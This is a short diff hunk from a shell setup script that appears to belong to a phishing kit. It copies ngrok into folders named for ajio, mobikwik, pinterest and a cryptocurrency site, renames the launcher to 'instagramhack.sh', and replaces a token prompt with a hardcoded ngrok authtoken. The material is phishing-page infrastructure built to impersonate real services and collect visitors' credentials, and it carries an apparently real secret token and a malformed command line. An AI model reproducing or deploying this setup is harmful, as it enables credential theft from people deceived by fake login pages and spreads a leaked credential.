@@ -54,13 +54,12 @@ cp -R ngrok sites/ajio/
 cp -R ngrok sites/cryptocurrency/
 cp -R ngrok sites/mobikwik/
 cp -R ngrok sites/pinterest/
-chmod 7777 AdvPhishing.sh
+chmod 7777 instagramhack.sh
 clear
 echo ""
 echo ""
 echo ""
-read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
-$token
+$./ngrok authtoken 1dZVrxwoGwWjEMP4a9IoYdv0Tig_2jVL3oEUPfrrBcZjcXTYH
 clear
 
 
